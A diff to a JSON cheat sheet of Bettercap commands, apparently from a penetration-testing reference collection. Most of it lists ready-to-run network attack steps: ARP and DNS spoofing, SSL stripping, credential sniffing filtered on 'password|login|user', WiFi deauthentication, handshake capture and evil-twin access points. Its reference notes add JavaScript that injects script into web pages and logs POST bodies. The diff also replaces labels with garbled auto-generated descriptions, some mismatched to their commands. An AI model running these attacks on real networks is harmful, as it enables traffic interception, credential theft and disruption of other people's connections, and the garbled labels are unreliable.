@@ -1,604 +1,678 @@
 {
   "sheet_id": "bettercap",
-  "title": "Bettercap (OffensiveRamen)",
-  "source": "OffensiveRamen",
-  "default_file": "bettercap.txt",
+  "title": "Bettercap",
+  "source": "",
+  "default_file": "",
   "categories": [
-    "INSTALLATION",
-    "NETWORK DISCOVERY",
-    "ARP SPOOFING (MITM)",
-    "DNS SPOOFING",
-    "HTTP/HTTPS PROXY",
-    "SNIFFING",
-    "CREDENTIAL SNIFFING",
-    "WIFI ATTACKS",
-    "BLE (BLUETOOTH LOW ENERGY)",
-    "CAPLETS (SCRIPTS)",
-    "WEB UI",
-    "PROXY SCRIPTS (JAVASCRIPT)",
-    "COMMON ATTACK WORKFLOWS"
+    "General"
   ],
   "commands": [
     {
       "switch": "Kali/Debian",
       "template": "sudo apt install bettercap",
-      "description": "sudo apt install bettercap",
-      "category": "INSTALLATION",
+      "description": "Run Kali/Debian command",
+      "category": "General",
       "original": "sudo apt install bettercap"
     },
     {
       "switch": "macOS",
       "template": "brew install bettercap",
-      "description": "brew install bettercap",
-      "category": "INSTALLATION",
+      "description": "Run macOS command",
+      "category": "General",
       "original": "brew install bettercap"
     },
     {
       "switch": "Go",
       "template": "go install <domain_name>/bettercap/bettercap@latest",
-      "description": "go install github.com/bettercap/bettercap@latest",
-      "category": "INSTALLATION",
-      "original": "go install github.com/bettercap/bettercap@latest"
+      "description": "Run Go command",
+      "category": "General",
+      "original": "go install <domain_name>/bettercap/bettercap@latest"
     },
     {
       "switch": "Start",
       "template": "sudo bettercap",
-      "description": "sudo bettercap",
-      "category": "INSTALLATION",
+      "description": "Run Start command",
+      "category": "General",
       "original": "sudo bettercap"
     },
     {
-      "switch": "Start Specific interface",
+      "switch": "Specific interface",
       "template": "sudo bettercap -iface <interface>",
-      "description": "sudo bettercap -iface eth0",
-      "category": "INSTALLATION",
-      "original": "sudo bettercap -iface eth0"
+      "description": "Run Specific interface command",
+      "category": "General",
+      "original": "sudo bettercap -iface <interface>"
     },
     {
-      "switch": "Start Run caplet",
+      "switch": "Run caplet",
       "template": "sudo bettercap -caplet script.cap",
-      "description": "sudo bettercap -caplet script.cap",
-      "category": "INSTALLATION",
+      "description": "Run Run caplet command",
+      "category": "General",
       "original": "sudo bettercap -caplet script.cap"
     },
     {
       "switch": "Active host discovery",
       "template": "net.probe on",
-      "description": "net.probe on",
-      "category": "NETWORK DISCOVERY",
+      "description": "Run Active host discovery command",
+      "category": "General",
       "original": "net.probe on"
     },
     {
       "switch": "Show discovered hosts",
       "template": "net.show",
-      "description": "net.show",
-      "category": "NETWORK DISCOVERY",
+      "description": "Run Show discovered hosts command",
+      "category": "General",
       "original": "net.show"
     },
     {
       "switch": "Passive recon",
       "template": "net.recon on",
-      "description": "net.recon on",
-      "category": "NETWORK DISCOVERY",
+      "description": "Run Passive recon command",
+      "category": "General",
       "original": "net.recon on"
     },
     {
       "switch": "Clear host list",
       "template": "net.clear",
-      "description": "net.clear",
-      "category": "NETWORK DISCOVERY",
+      "description": "Run Clear host list command",
+      "category": "General",
       "original": "net.clear"
     },
     {
       "switch": "Target specific hosts",
       "template": "set arp.spoof.targets <target_ip>",
-      "description": "set arp.spoof.targets 10.10.10.5",
-      "category": "NETWORK DISCOVERY",
-      "original": "set arp.spoof.targets 10.10.10.5"
+      "description": "Run Target specific hosts command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
     },
     {
-      "switch": "set arp.spoof.targets 10.10.10.5,10.10.10.6",
+      "switch": "Execute set command with configured options",
       "template": "set arp.spoof.targets <target_ip>,<target_ip>",
-      "description": "set arp.spoof.targets 10.10.10.5,10.10.10.6",
-      "category": "NETWORK DISCOVERY",
-      "original": "set arp.spoof.targets 10.10.10.5,10.10.10.6"
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>,<target_ip>"
     },
     {
       "switch": "Full duplex (both directions)",
       "template": "set arp.spoof.fullduplex true",
-      "description": "set arp.spoof.fullduplex true",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Full duplex (both directions) command",
+      "category": "General",
       "original": "set arp.spoof.fullduplex true"
     },
     {
-      "switch": "Full duplex (both directions) Victim IP",
+      "switch": "Victim IP",
       "template": "set arp.spoof.targets <target_ip>",
-      "description": "set arp.spoof.targets 10.10.10.5",
-      "category": "ARP SPOOFING (MITM)",
-      "original": "set arp.spoof.targets 10.10.10.5"
+      "description": "Run Victim IP command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
     },
     {
-      "switch": "arp.spoof on",
+      "switch": "Execute arp.spoof command with configured options",
       "template": "arp.spoof on",
-      "description": "arp.spoof on",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
       "original": "arp.spoof on"
     },
     {
       "switch": "Spoof entire subnet",
       "template": "set arp.spoof.targets <subnet_cidr>",
-      "description": "set arp.spoof.targets 10.10.10.0/24",
-      "category": "ARP SPOOFING (MITM)",
-      "original": "set arp.spoof.targets 10.10.10.0/24"
+      "description": "Run Spoof entire subnet command",
+      "category": "General",
+      "original": "set arp.spoof.targets <subnet_cidr>"
     },
     {
-      "switch": "set arp.spoof.fullduplex true",
+      "switch": "Execute set command with configured options",
       "template": "set arp.spoof.fullduplex true",
-      "description": "set arp.spoof.fullduplex true",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
       "original": "set arp.spoof.fullduplex true"
     },
     {
-      "switch": "arp.spoof on",
+      "switch": "Execute arp.spoof command with configured options",
       "template": "arp.spoof on",
-      "description": "arp.spoof on",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
       "original": "arp.spoof on"
     },
     {
-      "switch": "Spoof with internal forwarding Intercept LAN-to-LAN",
+      "switch": "Spoof with internal forwarding",
       "template": "set arp.spoof.internal true",
-      "description": "set arp.spoof.internal true",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Spoof with internal forwarding command",
+      "category": "General",
       "original": "set arp.spoof.internal true"
     },
     {
-      "switch": "arp.spoof on",
+      "switch": "Execute arp.spoof command with configured options",
       "template": "arp.spoof on",
-      "description": "arp.spoof on",
-      "category": "ARP SPOOFING (MITM)",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
       "original": "arp.spoof on"
     },
     {
-      "switch": "set dns.spoof.domains example.com",
+      "switch": "Execute set command with configured options",
       "template": "set dns.spoof.domains <domain_name>",
-      "description": "set dns.spoof.domains example.com",
-      "category": "DNS SPOOFING",
-      "original": "set dns.spoof.domains example.com"
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set dns.spoof.domains <domain_name>"
     },
     {
       "switch": "Redirect to this IP",
       "template": "set dns.spoof.address <target_ip>",
-      "description": "set dns.spoof.address 10.10.10.100",
-      "category": "DNS SPOOFING",
-      "original": "set dns.spoof.address 10.10.10.100"
+      "description": "Run Redirect to this IP command",
+      "category": "General",
+      "original": "set dns.spoof.address <target_ip>"
     },
     {
       "switch": "Spoof all domains",
       "template": "set dns.spoof.all true",
-      "description": "set dns.spoof.all true",
-      "category": "DNS SPOOFING",
+      "description": "Run Spoof all domains command",
+      "category": "General",
       "original": "set dns.spoof.all true"
     },
     {
-      "switch": "dns.spoof on",
+      "switch": "Execute dns.spoof command with configured options",
       "template": "dns.spoof on",
-      "description": "dns.spoof on",
-      "category": "DNS SPOOFING",
+      "description": "Run Execute dns.spoof command with configured options command",
+      "category": "General",
       "original": "dns.spoof on"
     },
     {
       "switch": "Multiple domains",
       "template": "set dns.spoof.domains <domain_name>,<domain_name>,*.<domain_name>",
-      "description": "set dns.spoof.domains example.com,login.example.com,*.target.com",
-      "category": "DNS SPOOFING",
-      "original": "set dns.spoof.domains example.com,login.example.com,*.target.com"
+      "description": "Run Multiple domains command",
+      "category": "General",
+      "original": "set dns.spoof.domains <domain_name>,<domain_name>,*.<domain_name>"
     },
     {
-      "switch": "HTTP proxy (intercept cleartext) SSL strip",
+      "switch": "HTTP proxy (intercept cleartext)",
       "template": "set http.proxy.sslstrip true",
-      "description": "set http.proxy.sslstrip true",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run HTTP proxy (intercept cleartext) command",
+      "category": "General",
       "original": "set http.proxy.sslstrip true"
     },
     {
-      "switch": "http.proxy on",
+      "switch": "Execute http.proxy command with configured options",
       "template": "http.proxy on",
-      "description": "http.proxy on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute http.proxy command with configured options command",
+      "category": "General",
       "original": "http.proxy on"
     },
     {
       "switch": "HTTPS proxy (requires CA cert)",
       "template": "set https.proxy.sslstrip true",
-      "description": "set https.proxy.sslstrip true",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run HTTPS proxy (requires CA cert) command",
+      "category": "General",
       "original": "set https.proxy.sslstrip true"
     },
     {
-      "switch": "https.proxy on",
+      "switch": "Execute https.proxy command with configured options",
       "template": "https.proxy on",
-      "description": "https.proxy on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute https.proxy command with configured options command",
+      "category": "General",
       "original": "https.proxy on"
     },
     {
       "switch": "Custom proxy script (JavaScript)",
       "template": "set http.proxy.script /path/to/script.js",
-      "description": "set http.proxy.script /path/to/script.js",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Custom proxy script (JavaScript) command",
+      "category": "General",
       "original": "set http.proxy.script /path/to/script.js"
     },
     {
-      "switch": "http.proxy on",
+      "switch": "Execute http.proxy command with configured options",
       "template": "http.proxy on",
-      "description": "http.proxy on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute http.proxy command with configured options command",
+      "category": "General",
       "original": "http.proxy on"
     },
     {
       "switch": "SSL strip",
       "template": "set net.sniff.verbose true",
-      "description": "set net.sniff.verbose true",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run SSL strip command",
+      "category": "General",
       "original": "set net.sniff.verbose true"
     },
     {
-      "switch": "set arp.spoof.targets 10.10.10.5",
+      "switch": "Execute set command with configured options",
       "template": "set arp.spoof.targets <target_ip>",
-      "description": "set arp.spoof.targets 10.10.10.5",
-      "category": "HTTP/HTTPS PROXY",
-      "original": "set arp.spoof.targets 10.10.10.5"
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
     },
     {
-      "switch": "arp.spoof on",
+      "switch": "Execute arp.spoof command with configured options",
       "template": "arp.spoof on",
-      "description": "arp.spoof on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
       "original": "arp.spoof on"
     },
     {
-      "switch": "http.proxy on",
+      "switch": "Execute http.proxy command with configured options",
       "template": "http.proxy on",
-      "description": "http.proxy on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute http.proxy command with configured options command",
+      "category": "General",
       "original": "http.proxy on"
     },
     {
-      "switch": "net.sniff on",
+      "switch": "Execute net.sniff command with configured options",
       "template": "net.sniff on",
-      "description": "net.sniff on",
-      "category": "HTTP/HTTPS PROXY",
+      "description": "Run Execute net.sniff command with configured options command",
+      "category": "General",
       "original": "net.sniff on"
     },
     {
       "switch": "Start sniffer",
       "template": "net.sniff on",
-      "description": "net.sniff on",
-      "category": "SNIFFING",
+      "description": "Run Start sniffer command",
+      "category": "General",
       "original": "net.sniff on"
     },
     {
       "switch": "Verbose output",
       "template": "set net.sniff.verbose true",
-      "description": "set net.sniff.verbose true",
-      "category": "SNIFFING",
+      "description": "Run Verbose output command",
+      "category": "General",
       "original": "set net.sniff.verbose true"
     },
     {
       "switch": "Save to file",
       "template": "set net.sniff.output <output_pcap>",
-      "description": "set net.sniff.output capture.pcap",
-      "category": "SNIFFING",
-      "original": "set net.sniff.output capture.pcap"
+      "description": "Run Save to file command",
+      "category": "General",
+      "original": "set net.sniff.output <output_pcap>"
     },
     {
       "switch": "BPF filter",
       "template": "set net.sniff.filter \"tcp port 80\"",
-      "description": "set net.sniff.filter \"tcp port 80\"",
-      "category": "SNIFFING",
+      "description": "Run BPF filter command",
+      "category": "General",
       "original": "set net.sniff.filter \"tcp port 80\""
     },
     {
       "switch": "Regex filter",
       "template": "set net.sniff.regexp \"password|login|user\"",
-      "description": "set net.sniff.regexp \"password|login|user\"",
-      "category": "SNIFFING",
+      "description": "Run Regex filter command",
+      "category": "General",
       "original": "set net.sniff.regexp \"password|login|user\""
     },
     {
       "switch": "Stop",
       "template": "net.sniff off",
-      "description": "net.sniff off",
-      "category": "SNIFFING",
+      "description": "Run Stop command",
+      "category": "General",
       "original": "net.sniff off"
     },
     {
       "switch": "Automatic credential extraction",
       "template": "set net.sniff.verbose true",
-      "description": "set net.sniff.verbose true",
-      "category": "CREDENTIAL SNIFFING",
+      "description": "Run Automatic credential extraction command",
+      "category": "General",
       "original": "set net.sniff.verbose true"
     },
     {
-      "switch": "net.sniff on",
+      "switch": "Execute net.sniff command with configured options",
       "template": "net.sniff on",
-      "description": "net.sniff on",
-      "category": "CREDENTIAL SNIFFING",
+      "description": "Run Execute net.sniff command with configured options command",
+      "category": "General",
       "original": "net.sniff on"
     },
     {
       "switch": "Set interface to monitor mode first",
       "template": "sudo bettercap -iface <monitor_interface>",
-      "description": "sudo bettercap -iface wlan0mon",
-      "category": "WIFI ATTACKS",
-      "original": "sudo bettercap -iface wlan0mon"
+      "description": "Run Set interface to monitor mode first command",
+      "category": "General",
+      "original": "sudo bettercap -iface <monitor_interface>"
     },
     {
-      "switch": "WiFi recon Scan for APs",
+      "switch": "WiFi recon",
       "template": "wifi.recon on",
-      "description": "wifi.recon on",
-      "category": "WIFI ATTACKS",
+      "description": "Run WiFi recon command",
+      "category": "General",
       "original": "wifi.recon on"
     },
     {
-      "switch": "WiFi recon Show discovered APs",
+      "switch": "Show discovered APs",
       "template": "wifi.show",
-      "description": "wifi.show",
-      "category": "WIFI ATTACKS",
+      "description": "Run Show discovered APs command",
+      "category": "General",
       "original": "wifi.show"
     },
     {
-      "switch": "WiFi recon Specific channels",
-      "template": "wifi.recon.channel 1,6,11",
-      "description": "wifi.recon.channel 1,6,11",
-      "category": "WIFI ATTACKS",
-      "original": "wifi.recon.channel 1,6,11"
-    },
-    {
-      "switch": "Deauthentication Deauth all clients",
+      "switch": "Deauthentication",
       "template": "wifi.deauth <ap_bssid>",
-      "description": "wifi.deauth AP_BSSID",
-      "category": "WIFI ATTACKS",
-      "original": "wifi.deauth AP_BSSID"
+      "description": "Run Deauthentication command",
+      "category": "General",
+      "original": "wifi.deauth <ap_bssid>"
     },
     {
-      "switch": "Deauthentication Deauth specific client",
+      "switch": "Deauth specific client",
       "template": "wifi.deauth <client_mac>",
-      "description": "wifi.deauth CLIENT_MAC",
-      "category": "WIFI ATTACKS",
-      "original": "wifi.deauth CLIENT_MAC"
+      "description": "Run Deauth specific client command",
+      "category": "General",
+      "original": "wifi.deauth <client_mac>"
     },
     {
       "switch": "WPA handshake capture",
       "template": "set wifi.handshakes.file handshakes/",
-      "description": "set wifi.handshakes.file handshakes/",
-      "category": "WIFI ATTACKS",
+      "description": "Run WPA handshake capture command",
+      "category": "General",
       "original": "set wifi.handshakes.file handshakes/"
     },
     {
-      "switch": "wifi.recon on",
+      "switch": "Execute wifi.recon command with configured options",
       "template": "wifi.recon on",
-      "description": "wifi.recon on",
-      "category": "WIFI ATTACKS",
+      "description": "Run Execute wifi.recon command with configured options command",
+      "category": "General",
       "original": "wifi.recon on"
     },
     {
-      "switch": "WPA handshake capture Force reconnection",
+      "switch": "Force reconnection",
       "template": "wifi.deauth <ap_bssid>",
-      "description": "wifi.deauth AP_BSSID",
-      "category": "WIFI ATTACKS",
-      "original": "wifi.deauth AP_BSSID"
+      "description": "Run Force reconnection command",
+      "category": "General",
+      "original": "wifi.deauth <ap_bssid>"
     },
     {
-      "switch": "Evil twin Start rogue AP",
+      "switch": "Evil twin",
       "template": "wifi.ap on",
-      "description": "wifi.ap on",
-      "category": "WIFI ATTACKS",
+      "description": "Run Evil twin command",
+      "category": "General",
       "original": "wifi.ap on"
     },
     {
       "switch": "Scan BLE devices",
       "template": "ble.recon on",
-      "description": "ble.recon on",
-      "category": "BLE (BLUETOOTH LOW ENERGY)",
+      "description": "Run Scan BLE devices command",
+      "category": "General",
       "original": "ble.recon on"
     },
     {
       "switch": "Show discovered devices",
       "template": "ble.show",
-      "description": "ble.show",
-      "category": "BLE (BLUETOOTH LOW ENERGY)",
+      "description": "Run Show discovered devices command",
+      "category": "General",
       "original": "ble.show"
     },
     {
       "switch": "Enumerate services",
       "template": "ble.enum <device_mac>",
-      "description": "ble.enum DEVICE_MAC",
-      "category": "BLE (BLUETOOTH LOW ENERGY)",
-      "original": "ble.enum DEVICE_MAC"
+      "description": "Run Enumerate services command",
+      "category": "General",
+      "original": "ble.enum <device_mac>"
     },
     {
       "switch": "Write to characteristic",
       "template": "ble.write <device_mac> <uuid> <data>",
-      "description": "ble.write DEVICE_MAC UUID DATA",
-      "category": "BLE (BLUETOOTH LOW ENERGY)",
-      "original": "ble.write DEVICE_MAC UUID DATA"
+      "description": "Run Write to characteristic command",
+      "category": "General",
+      "original": "ble.write <device_mac> <uuid> <data>"
     },
     {
-      "switch": "Run caplet Web UI",
+      "switch": "Run caplet",
       "template": "sudo bettercap -caplet http-ui",
-      "description": "sudo bettercap -caplet http-ui",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Run caplet command",
+      "category": "General",
       "original": "sudo bettercap -caplet http-ui"
     },
     {
-      "switch": "Run caplet HTTPS Web UI",
+      "switch": "HTTPS Web UI",
       "template": "sudo bettercap -caplet https-ui",
-      "description": "sudo bettercap -caplet https-ui",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run HTTPS Web UI command",
+      "category": "General",
       "original": "sudo bettercap -caplet https-ui"
     },
     {
-      "switch": "Run caplet ARP spoof + sniff",
+      "switch": "ARP spoof + sniff",
       "template": "sudo bettercap -caplet pita",
-      "description": "sudo bettercap -caplet pita",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run ARP spoof + sniff command",
+      "category": "General",
       "original": "sudo bettercap -caplet pita"
     },
     {
-      "switch": "set arp.spoof.fullduplex true",
+      "switch": "Custom caplet example (mitm.cap):",
       "template": "set arp.spoof.fullduplex true",
-      "description": "set arp.spoof.fullduplex true",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Custom caplet example (mitm.cap): command",
+      "category": "General",
       "original": "set arp.spoof.fullduplex true"
     },
     {
-      "switch": "set arp.spoof.targets 10.10.10.5",
+      "switch": "Execute set command with configured options",
       "template": "set arp.spoof.targets <target_ip>",
-      "description": "set arp.spoof.targets 10.10.10.5",
-      "category": "CAPLETS (SCRIPTS)",
-      "original": "set arp.spoof.targets 10.10.10.5"
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
     },
     {
-      "switch": "set net.sniff.verbose true",
+      "switch": "Execute set command with configured options",
       "template": "set net.sniff.verbose true",
-      "description": "set net.sniff.verbose true",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
       "original": "set net.sniff.verbose true"
     },
     {
-      "switch": "set net.sniff.output /tmp/capture.pcap",
+      "switch": "Execute set command with configured options",
       "template": "set net.sniff.output /tmp/<output_pcap>",
-      "description": "set net.sniff.output /tmp/capture.pcap",
-      "category": "CAPLETS (SCRIPTS)",
-      "original": "set net.sniff.output /tmp/capture.pcap"
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set net.sniff.output /tmp/<output_pcap>"
     },
     {
-      "switch": "net.probe on",
+      "switch": "Execute net.probe command with configured options",
       "template": "net.probe on",
-      "description": "net.probe on",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Execute net.probe command with configured options command",
+      "category": "General",
       "original": "net.probe on"
     },
     {
-      "switch": "arp.spoof on",
+      "switch": "Execute arp.spoof command with configured options",
       "template": "arp.spoof on",
-      "description": "arp.spoof on",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
       "original": "arp.spoof on"
     },
     {
-      "switch": "net.sniff on",
+      "switch": "Execute net.sniff command with configured options",
       "template": "net.sniff on",
-      "description": "net.sniff on",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Execute net.sniff command with configured options command",
+      "category": "General",
       "original": "net.sniff on"
     },
     {
-      "switch": "http.proxy on",
+      "switch": "Execute http.proxy command with configured options",
       "template": "http.proxy on",
-      "description": "http.proxy on",
-      "category": "CAPLETS (SCRIPTS)",
+      "description": "Run Execute http.proxy command with configured options command",
+      "category": "General",
       "original": "http.proxy on"
     },
     {
       "switch": "Start with web interface",
       "template": "sudo bettercap -caplet https-ui",
-      "description": "sudo bettercap -caplet https-ui",
-      "category": "WEB UI",
+      "description": "Run Start with web interface command",
+      "category": "General",
       "original": "sudo bettercap -caplet https-ui"
     },
     {
       "switch": "Or manually",
       "template": "set api.rest.address <target_ip>",
-      "description": "set api.rest.address 0.0.0.0",
-      "category": "WEB UI",
-      "original": "set api.rest.address 0.0.0.0"
+      "description": "Run Or manually command",
+      "category": "General",
+      "original": "set api.rest.address <target_ip>"
     },
     {
-      "switch": "set api.rest.port 8083",
+      "switch": "Execute set command with configured options",
       "template": "set api.rest.port 8083",
-      "description": "set api.rest.port 8083",
-      "category": "WEB UI",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
       "original": "set api.rest.port 8083"
     },
     {
-      "switch": "set api.rest.username admin",
+      "switch": "Execute set command with configured options",
       "template": "set api.rest.username admin",
-      "description": "set api.rest.username admin",
-      "category": "WEB UI",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
       "original": "set api.rest.username admin"
     },
     {
-      "switch": "set api.rest.password password",
+      "switch": "Execute set command with configured options",
       "template": "set api.rest.password password",
-      "description": "set api.rest.password password",
-      "category": "WEB UI",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
       "original": "set api.rest.password password"
     },
     {
-      "switch": "api.rest on",
+      "switch": "Execute api.rest command with configured options",
       "template": "api.rest on",
-      "description": "api.rest on",
-      "category": "WEB UI",
+      "description": "Run Execute api.rest command with configured options command",
+      "category": "General",
       "original": "api.rest on"
     },
     {
-      "switch": "Inject content into HTTP responses",
-      "template": "set http.proxy.script caplets/Inject_content_into_HTTP_responses.js",
-      "description": "set http.proxy.script caplets/Inject_content_into_HTTP_responses.js",
-      "category": "PROXY SCRIPTS (JAVASCRIPT)",
-      "original": "set http.proxy.script caplets/Inject_content_into_HTTP_responses.js"
+      "switch": "1. MITM + credential capture",
+      "template": "net.probe on",
+      "description": "Run 1. MITM + credential capture command",
+      "category": "General",
+      "original": "net.probe on"
     },
     {
-      "switch": "Log POST data",
-      "template": "set http.proxy.script caplets/Log_POST_data.js",
-      "description": "set http.proxy.script caplets/Log_POST_data.js",
-      "category": "PROXY SCRIPTS (JAVASCRIPT)",
-      "original": "set http.proxy.script caplets/Log_POST_data.js"
+      "switch": "Execute set command with configured options",
+      "template": "set arp.spoof.fullduplex true",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set arp.spoof.fullduplex true"
     },
     {
-      "switch": "MITM + credential capture",
-      "template": "sudo bettercap -caplet caplets/MITM_credential_capture.cap",
-      "description": "sudo bettercap -caplet caplets/MITM_credential_capture.cap",
-      "category": "COMMON ATTACK WORKFLOWS",
-      "original": "sudo bettercap -caplet caplets/MITM_credential_capture.cap"
+      "switch": "Execute set command with configured options",
+      "template": "set arp.spoof.targets <subnet_cidr>",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set arp.spoof.targets <subnet_cidr>"
     },
     {
-      "switch": "DNS spoofing + phishing",
-      "template": "sudo bettercap -caplet caplets/DNS_spoofing_phishing.cap",
-      "description": "sudo bettercap -caplet caplets/DNS_spoofing_phishing.cap",
-      "category": "COMMON ATTACK WORKFLOWS",
-      "original": "sudo bettercap -caplet caplets/DNS_spoofing_phishing.cap"
+      "switch": "Execute arp.spoof command with configured options",
+      "template": "arp.spoof on",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
+      "original": "arp.spoof on"
     },
     {
-      "switch": "SSL stripping",
-      "template": "sudo bettercap -caplet caplets/SSL_stripping.cap",
-      "description": "sudo bettercap -caplet caplets/SSL_stripping.cap",
-      "category": "COMMON ATTACK WORKFLOWS",
-      "original": "sudo bettercap -caplet caplets/SSL_stripping.cap"
+      "switch": "Execute net.sniff command with configured options",
+      "template": "net.sniff on",
+      "description": "Run Execute net.sniff command with configured options command",
+      "category": "General",
+      "original": "net.sniff on"
     },
     {
-      "switch": "WiFi handshake capture",
-      "template": "sudo bettercap -caplet caplets/WiFi_handshake_capture.cap",
-      "description": "sudo bettercap -caplet caplets/WiFi_handshake_capture.cap",
-      "category": "COMMON ATTACK WORKFLOWS",
-      "original": "sudo bettercap -caplet caplets/WiFi_handshake_capture.cap"
+      "switch": "2. DNS spoofing + phishing",
+      "template": "set arp.spoof.targets <target_ip>",
+      "description": "Run 2. DNS spoofing + phishing command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
+    },
+    {
+      "switch": "Execute arp.spoof command with configured options",
+      "template": "arp.spoof on",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
+      "original": "arp.spoof on"
+    },
+    {
+      "switch": "Execute set command with configured options",
+      "template": "set dns.spoof.domains <domain_name>",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set dns.spoof.domains <domain_name>"
+    },
+    {
+      "switch": "Execute set command with configured options",
+      "template": "set dns.spoof.address <target_ip>",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set dns.spoof.address <target_ip>"
+    },
+    {
+      "switch": "Execute dns.spoof command with configured options",
+      "template": "dns.spoof on",
+      "description": "Run Execute dns.spoof command with configured options command",
+      "category": "General",
+      "original": "dns.spoof on"
+    },
+    {
+      "switch": "3. SSL stripping",
+      "template": "set arp.spoof.targets <target_ip>",
+      "description": "Run 3. SSL stripping command",
+      "category": "General",
+      "original": "set arp.spoof.targets <target_ip>"
+    },
+    {
+      "switch": "Execute arp.spoof command with configured options",
+      "template": "arp.spoof on",
+      "description": "Run Execute arp.spoof command with configured options command",
+      "category": "General",
+      "original": "arp.spoof on"
+    },
+    {
+      "switch": "Execute set command with configured options",
+      "template": "set http.proxy.sslstrip true",
+      "description": "Run Execute set command with configured options command",
+      "category": "General",
+      "original": "set http.proxy.sslstrip true"
+    },
+    {
+      "switch": "Execute http.proxy command with configured options",
+      "template": "http.proxy on",
+      "description": "Run Execute http.proxy command with configured options command",
+      "category": "General",
+      "original": "http.proxy on"
+    },
+    {
+      "switch": "Execute net.sniff command with configured options",
+      "template": "net.sniff on",
+      "description": "Run Execute net.sniff command with configured options command",
+      "category": "General",
+      "original": "net.sniff on"
+    },
+    {
+      "switch": "4. WiFi handshake capture",
+      "template": "wifi.recon on",
+      "description": "Run 4. WiFi handshake capture command",
+      "category": "General",
+      "original": "wifi.recon on"
+    },
+    {
+      "switch": "Wait for target AP",
+      "template": "wifi.deauth <target_bssid>",
+      "description": "Run Wait for target AP command",
+      "category": "General",
+      "original": "wifi.deauth <target_bssid>"
     }
   ],
   "reference_notes": [
-    "[CREDENTIAL SNIFFING] Captures credentials from:",
-    "[CAPLETS (SCRIPTS)] Custom caplet example (mitm.cap):",
-    "[TIPS] Use fullduplex for reliable MITM",
-    "[TIPS] Caplets automate complex attack chains",
-    "[TIPS] Web UI provides visual network map",
-    "[TIPS] WiFi attacks require monitor mode interface",
-    "[TIPS] net.probe actively discovers all hosts on subnet",
-    "[TIPS] Proxy scripts enable real-time traffic manipulation",
-    "[TIPS] BLE recon useful for IoT pentesting",
-    "[TIPS] HSTS prevents SSL stripping on modern sites",
-    "[TIPS] Save captures for offline analysis in Wireshark",
-    "[TIPS] Run net.probe before arp.spoof for target discovery"
+    "[\ud83c\udf36 Bettercap] Swiss army knife for network attacks, MITM, WiFi, BLE, and",
+    "[\ud83c\udf36 Bettercap] HID reconnaissance and exploitation.",
+    "[Wifi Attacks] wifi.recon.channel 1,6,11",
+    "[Proxy Scripts (Javascript)] // Inject content into HTTP responses",
+    "[Proxy Scripts (Javascript)] function onResponse(req, res) {",
+    "[Proxy Scripts (Javascript)] if (res.ContentType.indexOf('text/html') == 0) {",
+    "[Proxy Scripts (Javascript)] var body = res.ReadBody();",
+    "[Proxy Scripts (Javascript)] res.Body = body.replace('</head>',",
+    "[Proxy Scripts (Javascript)] '<script>alert(\"injected\")</script></head>');",
+    "[Proxy Scripts (Javascript)] }",
+    "[Proxy Scripts (Javascript)] }",
+    "[Proxy Scripts (Javascript)] // Log POST data",
+    "[Proxy Scripts (Javascript)] function onRequest(req, res) {",
+    "[Proxy Scripts (Javascript)] if (req.Method == \"POST\") {",
+    "[Proxy Scripts (Javascript)] log(\"POST \" + req.Hostname + req.Path +",
+    "[Proxy Scripts (Javascript)] \" | Body: \" + req.ReadBody());",
+    "[Proxy Scripts (Javascript)] }",
+    "[Proxy Scripts (Javascript)] }",
+    "[Tips] Use fullduplex for reliable MITM",
+    "[Tips] Caplets automate complex attack chains",
+    "[Tips] Web UI provides visual network map",
+    "[Tips] WiFi attacks require monitor mode interface",
+    "[Tips] net.probe actively discovers all hosts on subnet",
+    "[Tips] Proxy scripts enable real-time traffic manipulation",
+    "[Tips] BLE recon useful for IoT pentesting",
+    "[Tips] HSTS prevents SSL stripping on modern sites",
+    "[Tips] Save captures for offline analysis in Wireshark",
+    "[Tips] Run net.probe before arp.spoof for target discovery"
